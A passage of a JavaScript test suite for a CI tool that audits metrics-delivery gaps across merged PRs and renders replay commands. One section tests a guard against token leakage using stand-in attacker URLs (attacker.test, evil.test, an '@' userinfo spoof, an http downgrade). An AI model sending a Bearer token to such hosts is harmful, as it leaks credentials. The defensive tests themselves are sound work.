  //   2026-08-04T12:00Z  never_fired   passes (the frozen NOW — why it was green)
  //   2027-08-14T00:00Z  never_fired   passes (the horizon EXACTLY; `>` is strict)
  //   2027-08-15T00:00Z  unverifiable  FAILS  (past merged + RUN_HISTORY_DAYS)
  //
  // So it was a time bomb due just after 2027-08-14T00:00:00Z, which would have
  // reddened CI on a date rather than on a change — and for a reason having
  // nothing to do with the onboarding boundary this test exists to pin.
  //
  // Swept rather than spot-fixed: this was the suite's ONLY real-clock
  // dependency. `Date.now` appears zero times in this file, `NOW` is a frozen
  // instant, every other `classify(` call passes an explicit 4th argument, and
  // the one that does not — CLASS_KEYS at the top — passes an empty `prs`, so no
  // branch reads the clock at all.
  const exact = classify(prs, new Map(), Date.parse(merged), NOW);
  assert.deepEqual(exact.never_fired.map((r) => r.number), [77]);
  assert.deepEqual(exact.pre_onboarding, []);
});

test('classify: onboardedTs does not reclassify a pr that HAS a run', () => {
  // pre_onboarding is only reachable through the no-run branch. A pr with a
  // failed run stays failed even if it merged before onboarding.
  const prs = [pr(5, '2026-07-01T00:00:00Z', 'hasrun')];
  const byHead = new Map([['hasrun', run(1, 'hasrun', 'failure', '2026-07-01T01:00:00Z')]]);

  const c = classify(prs, byHead, Date.parse('2026-12-31T00:00:00Z'), NOW);

  assert.deepEqual(c.failed.map((r) => r.number), [5]);
  assert.deepEqual(c.pre_onboarding, []);
});

test('classify: all five classes populate from one mixed batch', () => {
  const prs = [
    pr(1, '2026-07-20T00:00:00Z', 'ok'),
    pr(2, '2026-07-20T00:00:00Z', 'bad'),
    pr(3, '2026-07-20T00:00:00Z', 'skip'),
    pr(4, '2026-07-20T00:00:00Z', 'gone'),
    pr(5, '2026-07-01T00:00:00Z', 'early'),
  ];
  const byHead = new Map([
    ['ok', run(1, 'ok', 'success', '2026-07-20T01:00:00Z')],
    ['bad', run(2, 'bad', 'failure', '2026-07-20T01:00:00Z')],
    ['skip', run(3, 'skip', 'skipped', '2026-07-20T01:00:00Z')],
  ]);

  const c = classify(prs, byHead, Date.parse('2026-07-10T00:00:00Z'), NOW);

  assert.deepEqual(c.delivered.map((r) => r.number), [1]);
  assert.deepEqual(c.failed.map((r) => r.number), [2]);
  assert.deepEqual(c.skipped_anomaly.map((r) => r.number), [3]);
  assert.deepEqual(c.never_fired.map((r) => r.number), [4]);
  assert.deepEqual(c.pre_onboarding.map((r) => r.number), [5]);
});

// ── dedupeByHead ─────────────────────────────────────────────────────────────

test('dedupeByHead: the latest created_at wins for a shared head_sha, in either input order', () => {
  const first = run(1, 'samesha', 'failure', '2026-07-01T00:00:00Z');
  const rerun = run(2, 'samesha', 'success', '2026-07-02T00:00:00Z');

  // Chronological input.
  const forward = dedupeByHead([first, rerun]);
  assert.equal(forward.size, 1);
  assert.equal(forward.get('samesha').id, 2);
  assert.equal(forward.get('samesha').conclusion, 'success');

  // Reversed input — the API returns runs newest-first, so this is the ordering
  // production actually sees. A naive last-write-wins would keep the failure.
  const reverse = dedupeByHead([rerun, first]);
  assert.equal(reverse.size, 1);
  assert.equal(reverse.get('samesha').id, 2);
  assert.equal(reverse.get('samesha').conclusion, 'success');
});

test('dedupeByHead: distinct head_shas are all kept', () => {
  const byHead = dedupeByHead([
    run(1, 'a', 'success', '2026-07-01T00:00:00Z'),
    run(2, 'b', 'failure', '2026-07-01T00:00:00Z'),
    run(3, 'c', 'skipped', '2026-07-01T00:00:00Z'),
  ]);

  assert.equal(byHead.size, 3);
  assert.deepEqual([...byHead.keys()].sort(), ['a', 'b', 'c']);
  assert.equal(byHead.get('b').id, 2);
});

test('dedupeByHead: an empty run list yields an empty map', () => {
  assert.equal(dedupeByHead([]).size, 0);
});

test('dedupeByHead: a SUCCESS is not displaced by a newer non-success', () => {
  // The direction recency alone got wrong. A delivery that succeeded stays
  // delivered — the consumer holds the row — so re-running it and failing must
  // NOT reclassify the PR as a gap. That would put an already-delivered PR on
  // the replay list and double-deliver it, the one error direction that writes
  // to prod twice rather than not at all.
  const ok = run(1, 'samesha', 'success', '2026-07-01T00:00:00Z');

  for (const later of [
    run(2, 'samesha', 'failure', '2026-07-02T00:00:00Z'),
    run(3, 'samesha', 'cancelled', '2026-07-02T00:00:00Z'),
    run(4, 'samesha', 'skipped', '2026-07-02T00:00:00Z'),
    run(5, 'samesha', null, '2026-07-02T00:00:00Z'), // a re-run still in flight
    run(6, 'samesha', 'neutral', '2026-07-02T00:00:00Z'),
  ]) {
    for (const order of [[ok, later], [later, ok]]) {
      const got = dedupeByHead(order);
      assert.equal(got.size, 1);
      assert.equal(
        got.get('samesha').id,
        1,
        `success (id 1) must win over a later ${later.conclusion} (id ${later.id})`,
      );
    }
  }
});

test('dedupeByHead: among non-successes the latest still wins', () => {
  // Success-first must not flatten the ordering it replaced: with no success
  // anywhere, the newest run is still the one that describes current state.
  const older = run(1, 'samesha', 'failure', '2026-07-01T00:00:00Z');
  const newer = run(2, 'samesha', 'cancelled', '2026-07-03T00:00:00Z');

  assert.equal(dedupeByHead([older, newer]).get('samesha').id, 2);
  assert.equal(dedupeByHead([newer, older]).get('samesha').id, 2);
});

test('dedupeByHead: two successes resolve to the later one', () => {
  const a = run(1, 'samesha', 'success', '2026-07-01T00:00:00Z');
  const b = run(2, 'samesha', 'success', '2026-07-05T00:00:00Z');

  assert.equal(dedupeByHead([a, b]).get('samesha').id, 2);
  assert.equal(dedupeByHead([b, a]).get('samesha').id, 2);
});

test('dedupeByHead: an UNCONCLUDED run outranks a NEWER failure', () => {
  // The hole success-first left open, in the SAME error direction it was written
  // to close. Neither run is a success, so the two-way test made this a plain
  // recency question: the newer FAILURE won, the PR classified `failed`, and it
  // reached the replay list — dispatching a second write while the older sibling
  // run was at that moment still delivering.
  //
  // The unconcluded run wins instead, so the head classifies in_flight, i.e.
  // `undecided`, and a later audit settles it. Not-yet is not never.
  const pending = run(1, 'samesha', null, '2026-07-01T00:00:00Z');
  const failed = run(2, 'samesha', 'failure', '2026-07-02T00:00:00Z');

  assert.equal(dedupeByHead([pending, failed]).get('samesha').id, 1);
  assert.equal(dedupeByHead([failed, pending]).get('samesha').id, 1);
});

test('dedupeByHead: a SUCCESS still outranks a newer UNCONCLUDED run', () => {
  // The middle tier must not displace the top one. A delivery that succeeded is
  // decided, and a re-run that has not finished cannot undecide it — reporting
  // `undecided` there would turn a settled repo into a permanently unsettled one
  // every time anybody re-ran a job.
  const ok = run(1, 'samesha', 'success', '2026-07-01T00:00:00Z');
  const pending = run(2, 'samesha', null, '2026-07-09T00:00:00Z');

  assert.equal(dedupeByHead([ok, pending]).get('samesha').id, 1);
  assert.equal(dedupeByHead([pending, ok]).get('samesha').id, 1);
});

test('dedupeByHead: among two UNCONCLUDED runs recency still decides', () => {
  // Recency breaks ties WITHIN a tier, so adding the tier must not flatten the
  // ordering inside it either.
  const older = run(1, 'samesha', null, '2026-07-01T00:00:00Z');
  const newer = run(2, 'samesha', null, '2026-07-04T00:00:00Z');

  assert.equal(dedupeByHead([older, newer]).get('samesha').id, 2);
  assert.equal(dedupeByHead([newer, older]).get('samesha').id, 2);
});

// ── retryDelayMs ─────────────────────────────────────────────────────────────

// A minimal Headers stand-in: only .get() is used, and a real Headers would
// lowercase keys anyway.
const hdrs = (o) => ({ get: (k) => (k in o ? String(o[k]) : null) });
const T0 = Date.UTC(2026, 7, 4, 12, 0, 0);

test('retryDelayMs: retry-after seconds is honoured, and it OUTRANKS x-ratelimit-reset', () => {
  // retry-after is the header secondary (abuse) limits send — the limit a
  // paginating audit actually trips. If reset won instead, this would wait 5s
  // when the server asked for 30.
  assert.equal(retryDelayMs(hdrs({ 'retry-after': '30' }), T0), 30000);
  assert.equal(
    retryDelayMs(
      hdrs({ 'retry-after': '30', 'x-ratelimit-reset': String(T0 / 1000 + 5) }),
      T0,
    ),
    30000,
  );
});

test('retryDelayMs: an HTTP-date retry-after is accepted too', () => {
  const when = new Date(T0 + 20000).toUTCString();
  assert.equal(retryDelayMs(hdrs({ 'retry-after': when }), T0), 20000);
});

test('retryDelayMs: a FUTURE x-ratelimit-reset is used when retry-after is absent', () => {
  assert.equal(retryDelayMs(hdrs({ 'x-ratelimit-reset': String(T0 / 1000 + 45) }), T0), 45000);
});

test('retryDelayMs: a missing or PAST reset falls back to the floor, not a negative wait', () => {
  // The old bug: `reset - now` on a missing header is a large NEGATIVE number.
  // Math.max pinned it to the 1s floor, so all four attempts burned in ~3s
  // against a limit that needed a real wait. Same visible value, but now it is
  // the deliberate "nothing usable, fail fast to exit 2" path rather than an
  // arithmetic accident — the tests below pin the cases that used to be
  // indistinguishable from it.
  assert.equal(retryDelayMs(hdrs({}), T0), 1000);
  assert.equal(retryDelayMs(hdrs({ 'x-ratelimit-reset': String(T0 / 1000 - 600) }), T0), 1000);
  assert.equal(retryDelayMs(hdrs({ 'x-ratelimit-reset': '0' }), T0), 1000);
  assert.equal(retryDelayMs(hdrs({ 'retry-after': 'not-a-date' }), T0), 1000);
});

test('RETRY_STATUS covers the transient failures and NOT the deterministic ones', () => {
  // Which statuses are retried decides whether one bad gateway on page 30 of 40
  // discards the other 39 pages of work: an aborted audit is an exit-2 UNKNOWN
  // over the entire repo, not a partial result.
  for (const transient of [403, 429, 500, 502, 503, 504]) {
    assert.ok(RETRY_STATUS.has(transient), `${transient} must be retried`);
  }

  // Retrying these wastes the attempt budget on an answer that will not change,
  // and a 404 in particular is how a mistyped caller filename presents — four
  // attempts make that failure slower to surface, not likelier to succeed.
  for (const deterministic of [400, 401, 404, 409, 422, 501]) {
    assert.equal(RETRY_STATUS.has(deterministic), false, `${deterministic} must NOT be retried`);
  }
});

test('retryDelayMs: the two headers have DIFFERENT ceilings', () => {
  // Unbounded, a reset an hour out would hang the job until its timeout. But a
  // single 60s ceiling was self-defeating in the other direction: 4 attempts
  // means 3 waits, so it capped the TOTAL wait at 180s and a documented
  // `retry-after: 300` burned every attempt inside a window that was still open,
  // exiting 2 UNKNOWN over a repo that obeying the header would have finished.
  //
  // Asserted against RETRY_WAIT_MS rather than restated literals, so a test can
  // only pass by agreeing with the ceilings that actually ship.
  assert.equal(RETRY_WAIT_MS.retryAfterCeiling > RETRY_WAIT_MS.rateLimitResetCeiling, true);

  // retry-after: a SECONDARY limit, documented in seconds-to-minutes, so the ask
  // is affordable and gets honoured up to the higher ceiling.
  assert.equal(retryDelayMs(hdrs({ 'retry-after': '300' }), T0), 300000);
  assert.equal(retryDelayMs(hdrs({ 'retry-after': '3600' }), T0), RETRY_WAIT_MS.retryAfterCeiling);

  // x-ratelimit-reset: a PRIMARY-limit instant that can be most of an hour out.
  // Still 60s — parking a runner for 50 minutes to MAYBE finish is worse than an
  // honest exit-2 UNKNOWN the next scheduled audit resolves.
  assert.equal(
    retryDelayMs(hdrs({ 'x-ratelimit-reset': String(T0 / 1000 + 3600) }), T0),
    RETRY_WAIT_MS.rateLimitResetCeiling,
  );
  assert.equal(retryDelayMs(hdrs({ 'x-ratelimit-reset': String(T0 / 1000 + 300) }), T0), 60000);

  // The floor is shared, and applies to both.
  assert.equal(retryDelayMs(hdrs({ 'retry-after': '0' }), T0), RETRY_WAIT_MS.floor);
});

test('rateLimitAsk: the exhaustion message names the headers, or says nothing', () => {
  // "after 4 attempts" alone conflates two causes an operator must distinguish:
  // the API stayed broken, versus the audit gave up while the server's window was
  // still open. A bare message is itself the signal that no rate-limit headers
  // were present, i.e. a genuine server-side failure.
  assert.equal(rateLimitAsk(hdrs({})), '');
  assert.equal(rateLimitAsk(hdrs({ 'retry-after': '300' })), ' (retry-after: 300)');
  assert.equal(
    rateLimitAsk(hdrs({ 'retry-after': '300', 'x-ratelimit-remaining': '0' })),
    ' (retry-after: 300, x-ratelimit-remaining: 0)',
  );
});

// ── resolveApiUrl: where the Bearer token is allowed to go ───────────────────

test('resolveApiUrl: a relative path is joined to the API base', () => {
  assert.equal(
    resolveApiUrl('/repos/praetorian-inc/guard/pulls?state=closed'),
    'https://api.github.com/repos/praetorian-inc/guard/pulls?state=closed',
  );
  // An absolute api.github.com URL — what a real `rel="next"` target is — passes.
  assert.equal(
    resolveApiUrl('https://api.github.com/repositories/1/pulls?page=2'),
    'https://api.github.com/repositories/1/pulls?page=2',
  );
  // An explicit default port is the same origin, and must not be refused.
  assert.equal(
    resolveApiUrl('https://api.github.com:443/repos/x/y'),
    'https://api.github.com/repos/x/y',
  );
});

test('resolveApiUrl: refuses to send the token anywhere but the API', () => {
  // Every request carries `authorization: Bearer <token>` unconditionally, and an
  // absolute URL reaches here from a response envelope (the Link header), so the
  // destination is the one thing worth checking.
  //
  // The narrower hole is NOT the cross-origin one: `startsWith('http')` matches
  // `http://` before `https://`, so a downgrade to the SAME host passed — and put
  // the token on the wire in cleartext.
  assert.throws(
    () => resolveApiUrl('http://api.github.com/repos/x/y'),
    /refusing to send credentials to http:\/\/api\.github\.com/,
  );
  assert.throws(
    () => resolveApiUrl('https://attacker.test/repos/x/y'),
    /refusing to send credentials to https:\/\/attacker\.test/,
  );

  // Both of these START WITH the full base string, so a prefix test would admit
  // them while they resolve elsewhere. Parsing the origin is what closes that.
  assert.throws(
    () => resolveApiUrl('https://api.github.com.evil.test/repos/x/y'),
    /refusing to send credentials to https:\/\/api\.github\.com\.evil\.test/,
  );
  assert.throws(
    () => resolveApiUrl('https://api.github.com@evil.test/repos/x/y'),
    /refusing to send credentials to https:\/\/evil\.test/,
  );

  // Neither a path nor a URL. Refused rather than concatenated into something
  // that happens to resolve.
  assert.throws(() => resolveApiUrl('repos/x/y'), /must start with "\/"/);
  assert.throws(() => resolveApiUrl(''), /must start with "\/"/);
});

// ── runsInRange: slicing and the truncation guard ────────────────────────────

// A stub client. runsInRange already takes `client` as its only route to the
// network, so this fakes nothing about the transport — it just decides what the
// probe and the page fetch report, which is the whole point of the guard.
const RCFG = { owner: 'praetorian-inc', callerFile: 'leaderboard-metrics.yml', since: '2026-07-01' };

const stubClient = (plan) => {
  const seen = { probes: [], pages: [] };
  return {
    seen,
    gh: async (url) => {
      const range = decodeURIComponent(url.match(/created=([^&]+)/)[1]);
      seen.probes.push(range);
      return { total_count: plan.total(range) };
    },
    ghPaged: async (url) => {
      const range = decodeURIComponent(url.match(/created=([^&]+)/)[1]);
      seen.pages.push(range);
      return plan.runs(range);
    },
  };
};

test('runsInRange: a slice that grew between the probe and the fetch is TOLERATED', () => {
  // The probe says 5, the fetch returns 6 because a run was created in between.
  // The last slice always ends at today, so on a repo merging ~15 PRs a day this
  // is ordinary churn. Strict equality made it a spurious exit-2 "audit could
  // not complete" — a false page on the busiest repos.
  const client = stubClient({
    total: () => 5,
    runs: () => Array.from({ length: 6 }, (_, i) => ({ id: i, head_sha: `s${i}` })),
  });

  return runsInRange(client, RCFG, 'guard').then((got) => {
    assert.equal(got.length, 6, 'the extra run is kept — more data, not less');
  });
});

test('runsInRange: a SHORTFALL still throws — truncation is the real danger', () => {
  const client = stubClient({
    total: () => 10,
    runs: () => Array.from({ length: 4 }, (_, i) => ({ id: i, head_sha: `s${i}` })),
  });

  return assert.rejects(
    () => runsInRange(client, RCFG, 'guard'),
    /reported total_count=10 but only 4 runs were retrievable/,
  );
});

test('runsInRange: an exact match passes, and a zero-total slice costs no page fetch', () => {
  const exact = stubClient({
    total: () => 3,
    runs: () => [{ id: 1, head_sha: 'a' }, { id: 2, head_sha: 'b' }, { id: 3, head_sha: 'c' }],
  });
  const empty = stubClient({ total: () => 0, runs: () => [] });

  return Promise.all([
    runsInRange(exact, RCFG, 'guard').then((g) => assert.equal(g.length, 3)),
    runsInRange(empty, RCFG, 'guard').then((g) => {
      assert.deepEqual(g, []);
      assert.equal(empty.seen.pages.length, 0, 'total_count=0 must not fetch pages');
    }),
  ]);
});

test('runsInRange: a slice over the 1000 cap SUBDIVIDES instead of silently truncating', () => {
  // The bug that made 420 delivered guard PRs read as never-fired. Any range
  // spanning more than one day reports over the cap until it is narrow enough.
  let subdivided = 0;
  const client = stubClient({
    total: (range) => {
      const [a, b] = range.split('..');
      if (a === b) return 2; // a single day is under the cap
      subdivided++;
      return 1500;
    },
    runs: () => [{ id: 1, head_sha: 'a' }, { id: 2, head_sha: 'b' }],
  });

  return runsInRange(client, { ...RCFG, since: '2026-07-01' }, 'guard').then((got) => {
    assert.ok(subdivided > 0, 'the over-cap range must have been subdivided');
    // Every day between since and now got its own slice, and all their runs are
    // in the output — nothing was dropped by the recursion.
    assert.equal(got.length, client.seen.pages.length * 2);
    assert.ok(client.seen.pages.length > 1, 'subdivision must produce several slices');
    // No slice is ever fetched twice — a stack bug would double-count runs.
    assert.equal(new Set(client.seen.pages).size, client.seen.pages.length);
  });
});

test('SLICE_MAX leaves a margin below API_CAP, or the shortfall check is blind', () => {
  // The shortfall check is `got.length < total`, and `got.length` is itself
  // CLAMPED to API_CAP — so it can never exceed it. If a slice were allowed to
  // probe AT the cap, one run arriving before the fetch would return a clamped
  // 1000 and `1000 < 1000` is false: silently dropped, which is the exact failure
  // class this whole mechanism exists to prevent. The margin is what makes
  // between-probe-and-fetch growth observable instead of clamped away.
  assert.ok(SLICE_MAX < API_CAP, 'a slice threshold at the cap cannot detect truncation');

  // And the margin has to exceed a plausible amount of churn during one audit,
  // not merely be nonzero — guard merges on the order of 30 runs/day.
  assert.ok(API_CAP - SLICE_MAX >= 100, 'the margin must absorb real between-probe churn');
});

test('runsInRange: a slice OVER SLICE_MAX but under the hard cap still subdivides', () => {
  // The regression test for the boundary itself. A total of 950 is under the
  // API's 1000 cap, so the pre-fix code fetched it in one go and could not tell a
  // clamped result from a complete one. It must subdivide instead.
  // 950, expressed against API_CAP and NOT against SLICE_MAX: deriving it from
  // the threshold under test would make the fixture move with the bug, so
  // lowering SLICE_MAX back to the cap would keep this test green. Tying it to
  // the API's hard cap — a fact about GitHub, not a tunable — keeps it honest.
  const OVER = API_CAP - 50;
  assert.ok(OVER > SLICE_MAX && OVER < API_CAP, 'fixture must sit between the threshold and the cap');

  let sawWideProbe = false;
  const client = stubClient({
    total: (range) => {
      const [a, b] = range.split('..');
      if (a === b) return 2;
      sawWideProbe = true;
      return OVER;
    },
    runs: () => [{ id: 1, head_sha: 'a' }, { id: 2, head_sha: 'b' }],
  });

  return runsInRange(client, { ...RCFG, since: '2026-07-28' }, 'guard').then((got) => {
    assert.ok(sawWideProbe, 'the multi-day range must have been probed');
    assert.ok(client.seen.pages.length > 1, 'a 950-run range must be split, not fetched whole');
    // Every fetched slice was a single day, i.e. it recursed all the way down
    // rather than fetching the 950 as one page set.
    for (const range of client.seen.pages) {
      const [a, b] = range.split('..');
      assert.equal(a, b, `slice ${range} should have been subdivided further`);
    }
    assert.equal(got.length, client.seen.pages.length * 2);
  });
});

test('runsInRange: a fetch that REACHES the hard cap is rejected as untrustworthy', () => {
  // The other end of the same property. A slice is only fetched after probing at
  // or below SLICE_MAX, so coming back with API_CAP results means it grew by at
  // least the whole margin since the probe — and a result set sitting exactly on
  // the cap is indistinguishable from one clamped BY the cap. Tolerating growth
  // (which the shortfall test deliberately does) must not extend to tolerating a
  // result that may be truncated.
  const client = stubClient({
    total: () => SLICE_MAX,
    runs: () => Array.from({ length: API_CAP }, (_, i) => ({ id: i, head_sha: `s${i}` })),
  });

  return assert.rejects(
    () => runsInRange(client, RCFG, 'guard'),
    /reaching the API's 1000-result cap — the result set may be clamped/,
  );
});

test('runsInRange: a SINGLE DAY over the cap throws rather than reporting what it can see', () => {
  // Day is the floor the `created` filter supports, so this is unrepresentable.
  // Reporting the visible subset would invent gaps for the rest.
  const client = stubClient({ total: () => 1500, runs: () => [] });

  return assert.rejects(
    () => runsInRange(client, { ...RCFG, since: ymdToday() }, 'guard'),
    /exceeds the safe slice size of 900 .*and cannot be subdivided further/,
  );
});

function ymdToday() {
  return new Date().toISOString().slice(0, 10);
}

// ── chunk ────────────────────────────────────────────────────────────────────

test('chunk: splits into batches of at most n, losing and duplicating nothing', () => {
  assert.deepEqual(chunk([1, 2, 3, 4, 5], 2), [[1, 2], [3, 4], [5]]);
  assert.deepEqual(chunk([], 3), []);
  assert.deepEqual(chunk([1, 2, 3], 3), [[1, 2, 3]]);
  assert.deepEqual(chunk([1, 2, 3], 10), [[1, 2, 3]]);

  const big = Array.from({ length: 501 }, (_, i) => i + 1);
  const out = chunk(big, REPLAY_BATCH);
  assert.equal(out.length, 3);
  assert.deepEqual(out.map((b) => b.length), [250, 250, 1]);
  assert.deepEqual(out.flat(), big);
});

test('REPLAY_BATCH stays UNDER the backfill workflow matrix cap of 256', () => {
  // Not a tautology against the impl: 256 is the cap the backfill enforces
  // itself, quoted from leaderboard-backfill.yml's own guard, and a batch AT
  // the cap is one bad edge away from being refused.
  assert.ok(REPLAY_BATCH < 256, `REPLAY_BATCH=${REPLAY_BATCH} must be < 256`);
});

// ── replayList ───────────────────────────────────────────────────────────────

test('replayList: unions failed + never_fired + skipped_anomaly, sorted NUMERICALLY', () => {
  // The fixture is chosen so three different implementations give three
  // different answers:
  //   correct (numeric sort) → [9, 10, 100]
  //   no sort at all         → [100, 9, 10]   (concatenation order)
  //   default lexicographic  → [10, 100, 9]
  const classes = {
    delivered: [rec(1), rec(2)],
    failed: [rec(100)],
    never_fired: [rec(9)],
    skipped_anomaly: [rec(10)],
    pre_onboarding: [rec(3)],
  };

  assert.deepEqual(replayList(classes), [9, 10, 100]);
});

test('replayList: delivered and pre_onboarding are never replayed', () => {
  const classes = {
    delivered: [rec(1), rec(2), rec(3)],
    failed: [],
    never_fired: [],
    skipped_anomaly: [],
    pre_onboarding: [rec(4), rec(5)],
  };

  assert.deepEqual(replayList(classes), []);
});

test('replayList: an in_flight pr is NOT replayed', () => {
  // The whole point of the in_flight class. A delivery that is still running
  // would be double-delivered by a replay, and consumer-side idempotency is not
  // established — so an unconcluded run must not reach this list, even though
  // it has not delivered anything yet.
  const classes = {
    delivered: [],
    failed: [rec(50)],
    never_fired: [],
    skipped_anomaly: [],
    pre_onboarding: [],
    in_flight: [rec(1), rec(2), rec(3)],
  };

  // 50 is present, proving the list is not empty for an unrelated reason.
  assert.deepEqual(replayList(classes), [50]);
});

test('replayList: sorts across all three replayable classes together', () => {
  const classes = {
    delivered: [],
    failed: [rec(30), rec(2)],
    never_fired: [rec(11), rec(1)],
    skipped_anomaly: [rec(200), rec(3)],
    pre_onboarding: [],
  };

  assert.deepEqual(replayList(classes), [1, 2, 3, 11, 30, 200]);
});

// ── renderMarkdown ───────────────────────────────────────────────────────────

const CFG = {
  owner: 'praetorian-inc',
  backfillCaller: 'leaderboard-backfill-caller.yml',
};

const gapReport = ({
  hasCaller = true,
  replay = [9, 10, 100],
  preOnboarding = 0,
  inFlight = 0,
} = {}) => ({
  since: '2026-07-05',
  totals: { merged_prs: 12, delivered: 9, in_flight: inFlight },
  repos_with_gaps: [
    {
      repo: 'guard',
      failed: 1,
      never_fired: 1,
      skipped_anomaly: 1,
      pre_onboarding: preOnboarding,
      in_flight: inFlight,
      replay,
    },
  ],
  repos: [{ repo: 'guard', has_caller: hasCaller }],
});

test('renderMarkdown: emits the no-caller callout only when has_caller is false', () => {
  const withoutCaller = renderMarkdown(gapReport({ hasCaller: false }), CFG);
  assert.match(withoutCaller, /has no `leaderboard-metrics\.yml` caller/);
  assert.match(withoutCaller, /never-fired delivery, not a failure/);

  const withCaller = renderMarkdown(gapReport({ hasCaller: true }), CFG);
  assert.doesNotMatch(withCaller, /has no `leaderboard-metrics\.yml` caller/);
  // Everything else about the two renders is the same, so the assertions above
  // are about the callout and nothing else.
  assert.match(withCaller, /### `guard`/);
  assert.match(withCaller, /A leaderboard metrics delivery gap was detected/);
});

test('renderMarkdown: the replay command carries the comma-joined PR numbers', () => {
  const md = renderMarkdown(gapReport({ replay: [9, 10, 100] }), CFG);

  assert.match(
    md,
    /gh workflow run leaderboard-backfill-caller\.yml --repo praetorian-inc\/guard/,
  );
  assert.match(md, /-f pr_numbers='9,10,100'/);
  // The human-readable list is separate from the command and must agree.
  assert.match(md, /Affected PRs \(3\): #9, #10, #100/);
});

test('renderMarkdown: the replay command honours a custom backfill caller and owner', () => {
  const md = renderMarkdown(gapReport(), { owner: 'acme', backfillCaller: 'other.yml' });

  assert.match(md, /gh workflow run other\.yml --repo acme\/guard/);
  assert.doesNotMatch(md, /leaderboard-backfill-caller\.yml/);
});

test('renderMarkdown: per-class counts are tabulated, pre-onboarding only when nonzero', () => {
  const withPre = renderMarkdown(gapReport({ preOnboarding: 4 }), CFG);
  assert.match(withPre, /\| pre-onboarding \(not a gap\) \| 4 \|/);

  const withoutPre = renderMarkdown(gapReport({ preOnboarding: 0 }), CFG);
  assert.doesNotMatch(withoutPre, /pre-onboarding/);

  // The three gap classes are always tabulated.
  assert.match(withoutPre, /\| failed \| 1 \|/);
  assert.match(withoutPre, /\| never fired \| 1 \|/);
  assert.match(withoutPre, /\| skipped anomaly \| 1 \|/);
});

test('renderMarkdown: a replay list over the matrix cap is split into dispatchable batches', () => {
  // The backfill fans out one matrix job per PR and refuses any run over 256,
  // so a single command for 600 PRs is one the report already knows will bounce.
  const replay = Array.from({ length: 600 }, (_, i) => i + 1);
  const md = renderMarkdown(gapReport({ replay }), CFG);

  const cmds = md.match(/gh workflow run/g) ?? [];
  assert.equal(cmds.length, 3, '600 PRs at 250 per batch is 3 commands');
  assert.match(md, /exceeds the backfill's 256-job matrix cap/);
  assert.match(md, /split into 3 batches/);

  // Every PR appears exactly once across the batches — a split that drops or
  // repeats entries would under-replay or double-deliver.
  const listed = [...md.matchAll(/-f pr_numbers='([^']+)'/g)]
    .flatMap((m) => m[1].split(',').map(Number))
    .sort((a, b) => a - b);
  assert.deepEqual(listed, replay);

  // No batch exceeds the cap.
  for (const m of md.matchAll(/-f pr_numbers='([^']+)'/g)) {
    assert.ok(m[1].split(',').length <= REPLAY_BATCH);
  }
});

test('renderMarkdown: a replay list under the cap stays ONE command with no batch talk', () => {
  const md = renderMarkdown(gapReport({ replay: [9, 10, 100] }), CFG);

  assert.equal((md.match(/gh workflow run/g) ?? []).length, 1);
  assert.doesNotMatch(md, /matrix cap/);
  assert.doesNotMatch(md, /batches/);
});

test('renderMarkdown: an undecided count is tabulated as NOT a gap, and only when nonzero', () => {
  const running = renderMarkdown(gapReport({ inFlight: 2 }), CFG);
  assert.match(running, /\| not yet decided \(not a gap, not replayed\) \| 2 \|/);
  // It is reported alongside the gaps but excluded from the replay command, so
  // the row must not change what gets replayed.
  assert.match(running, /-f pr_numbers='9,10,100'/);

  const none = renderMarkdown(gapReport({ inFlight: 0 }), CFG);
  assert.doesNotMatch(none, /not yet decided/);
});

test('renderMarkdown: a clean report says No gaps and offers no replay command', () => {
  const clean = {
    since: '2026-07-05',
    totals: { merged_prs: 12, delivered: 12, in_flight: 0 },
    repos_with_gaps: [],
    repos: [{ repo: 'guard', has_caller: true }],
  };

  const md = renderMarkdown(clean, CFG);

  assert.match(md, /No gaps\. Every merged PR in the window enqueued a successful metrics delivery\./);
  assert.doesNotMatch(md, /gh workflow run/);
  assert.doesNotMatch(md, /pr_numbers/);
  assert.doesNotMatch(md, /delivery gap was detected/);
  // The window header still reports what was examined.
  assert.match(md, /Window `2026-07-05` → now/);
  assert.match(md, /Merged PRs examined: \*\*12\*\*/);
  assert.match(md, /Delivered: \*\*12\*\*/);
});

test('renderMarkdown: a clean report with a run still in flight does NOT claim every PR delivered', () => {
  // "Every merged PR delivered successfully" would be a FALSE sentence while a
  // delivery is undecided — and falsely reassuring at exactly the moment it
  // matters. The gap list is empty either way, so only the wording distinguishes
  // "verified clean" from "clean so far, two still unknown".
  const cleanButRunning = {
    since: '2026-07-05',
    totals: { merged_prs: 12, delivered: 10, in_flight: 2 },
    repos_with_gaps: [],
    repos: [{ repo: 'guard', has_caller: true }],
  };

  const md = renderMarkdown(cleanButRunning, CFG);

  assert.match(md, /No gaps among the PRs this audit can decide/);
  assert.match(md, /Of \*\*12\*\* merged PR\(s\), \*\*2\*\* are not yet decided/);
  assert.match(md, /re-run the\s+audit once they settle/);
  // in_flight has TWO causes and the prose must name both, or a reader takes
  // "still running" literally and treats a just-merged PR with no run row as
  // something other than the undecided case it is.
  assert.match(md, /still running/);
  assert.match(md, /merged too recently for\s+its run to exist yet/);
  // The unqualified claim must be absent — this is the assertion the bug fails.
  assert.doesNotMatch(md, /No gaps\. Every merged PR in the window enqueued a successful metrics delivery\./);
  // Still no replay is offered: an in-flight delivery is not replayable.
  assert.doesNotMatch(md, /gh workflow run/);
});

test('renderMarkdown: a clean report with pre-onboarding PRs does NOT claim every PR delivered', () => {
  // The live wording defect, pinned to the numbers that exposed it. These are
  // caeruleus's real figures for `--since 2026-05-06`: 31 merged, 2 delivered, 29
  // pre-onboarding, no gaps, exit 0 — and the report printed "Every merged PR in
  // the window has a successful metrics delivery." False for 29 of the 31, and
  // false in the reassuring direction, about exactly the PRs a backfill still
  // owes. `in_flight` had this caveat from round 1; `pre_onboarding` was missed.
  const cleanButPreOnboarding = {
    since: '2026-05-06',
    totals: { merged_prs: 31, delivered: 2, in_flight: 0, pre_onboarding: 29 },
    repos_with_gaps: [],
    repos: [{ repo: 'caeruleus', has_caller: true }],
  };

  const md = renderMarkdown(cleanButPreOnboarding, CFG);

  // The unqualified claim must be absent — this is the assertion the bug fails.
  assert.doesNotMatch(md, /No gaps\. Every merged PR in the window enqueued a successful metrics delivery\./);
  assert.match(md, /No gaps among the PRs this audit can decide/);
  assert.match(md, /Of \*\*31\*\* merged PR\(s\), \*\*29\*\* merged before this repo had a caller/);
  // Both halves of the pre-onboarding truth, because either alone misleads:
  // "not a gap" without "did not deliver" reads as delivered, and "did not
  // deliver" without "not a gap" reads as a failure to chase.
  assert.match(md, /they are not gaps/);
  assert.match(md, /did NOT deliver/);
  // And it must point at the only thing that resolves them.
